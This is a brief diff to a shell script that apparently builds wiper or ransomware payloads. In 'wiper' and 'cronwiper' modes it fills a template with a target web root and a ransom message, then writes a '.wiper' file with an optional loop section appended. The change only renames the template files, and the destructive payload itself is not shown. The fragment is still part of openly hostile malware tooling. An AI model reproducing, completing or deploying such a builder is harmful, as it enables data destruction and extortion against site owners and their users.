@@ -8,7 +8,7 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
         exit
     fi
 
-    content=$(cat .pest);
+    content=$(cat .template);
 
     content=${content//-r WEBROOT=/-r WEBROOT=\"$2\"}
     content=${content//-r RANSOM_MESSAGE=/-r RANSOM_MESSAGE=\"$3\"}
@@ -16,7 +16,7 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
     if [[ "$1" = "wiper" ]]; then
 
-        loop_part=$(cat .loop_part)
+        loop_part=$(cat .loop_template)
 
         echo "$content" > ".wiper"
         echo -e "\n\n$loop_part" >> ".wiper"
